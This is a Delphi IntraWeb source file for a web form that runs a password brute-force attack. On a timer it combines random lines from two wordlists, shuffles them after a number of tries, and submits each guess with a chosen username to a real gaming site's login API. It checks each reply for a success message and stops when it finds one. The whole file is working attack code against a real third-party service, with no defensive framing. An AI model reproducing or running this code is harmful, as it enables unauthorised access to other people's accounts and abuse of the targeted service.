unit Tela;

interface

uses
  Classes, SysUtils, IWAppForm, IWApplication, IWColor, IWTypes,
  Vcl.Imaging.jpeg, Vcl.Controls, IWVCLBaseControl, IWBaseControl,
  IWBaseHTMLControl, IWControl, IWCompExtCtrls, IWCompLabel, IWCompMemo,
  IWCompButton, IWCompEdit, IWCompCheckbox, IWBaseComponent,
  IWBaseHTMLComponent, IWBaseHTML40Component, Math, URLmon;

type
  TIWForm2 = class(TIWAppForm)
    IWImage1: TIWImage;
    mmSenha: TIWMemo;
    IWLabel1: TIWLabel;
    IWLabel2: TIWLabel;
    Acontecer: TIWButton;
    edtLogin: TIWEdit;
    mmSenha2: TIWMemo;
    IWTimer1: TIWTimer;
    IWButton1: TIWButton;
    IWLabel6: TIWLabel;
    realLogin: TIWEdit;
    slaMemo: TIWMemo;
    procedure IWTimer1Timer(Sender: TObject);
    procedure AcontecerClick(Sender: TObject);
    procedure IWButton1Click(Sender: TObject);
  public
  end;

implementation

{$R *.dfm}
var
   teste : boolean;
   Chave: String;
   i : Integer = 1;
   o : integer;
   p : Integer;
   s1 : String;
   s2 : String;
   ss2 : String;
   ss1 : String;

function Embaralhar (const aString: string): String;
var
  z : integer;
  pos: integer;
  lista: TStrings;
  begin
    Randomize;

    lista := TStringList.Create;

    for z := 1 to aString.Length do
      lista.Add(aString[z]);

      for z := 1 to aString.Length do
      begin
        pos := Random(lista.Count);
        Result := Result + lista.Strings[pos];
        lista.Delete(pos);

      end;

      FreeAndNil(lista);

  end;



procedure TIWForm2.AcontecerClick(Sender: TObject);
begin
 mmSenha2.Text := mmSenha.Text;
 IWTimer1.Enabled := True;

end;

procedure TIWForm2.IWButton1Click(Sender: TObject);
begin
  IWTimer1.Enabled := False;
end;


procedure TIWForm2.IWTimer1Timer(Sender: TObject);
var
  p : integer;
  o : integer;
  tamanho : integer;
  n : integer;
  link : String;
  autenticar: String;
  destino : String;


begin
  i := 0 + i;
  s1 := '';
  ss1 := '';
  s2 := '';
  ss2 := '';
  destino:= 'C:\CloudDDT\auth.html';
  autenticar:=  '{"error":0,"msg":"ok"}';


  teste := false;



  if (i <= mmSenha.Lines.Count * mmSenha2.Lines.Count * 10) then begin

    i := i + 1;
    Randomize;
    p := Random(mmSenha.Lines.Count);
    o := Random(mmSenha2.Lines.Count);
    s1 := s1 + mmSenha.Lines[p];
    s2 := s2 + mmSenha2.Lines[o];

    Chave := s1 + s2;
  end else begin
    Randomize;
    p := Random(mmSenha.Lines.Count);
    o := Random(mmSenha2.Lines.Count);
    s1 := s1 + mmSenha.Lines[p];
    s2 := s2 + mmSenha2.Lines[o];

    Chave := s1 + s2;

    Chave := Embaralhar(Chave)
  end;
  link := 'http://www.337.com/api.php?a=1002&username='+realLogin.Text+'&password='+ Chave +'&submit=login-btn';
  URLDownloadToFile(nil,pchar(link),pchar(destino),0,nil);
  slaMemo.Lines.LoadFromFile(destino);

  if slaMemo.Text = '{"error":0,"msg":"ok"}' then begin
    IWTimer1.Enabled := false;
    edtLogin.Text := '';
    edtLogin.Text := 'login com sucesso';
  end;






  Refresh;





end;





initialization
  TIWForm2.SetAsMainForm;

end.
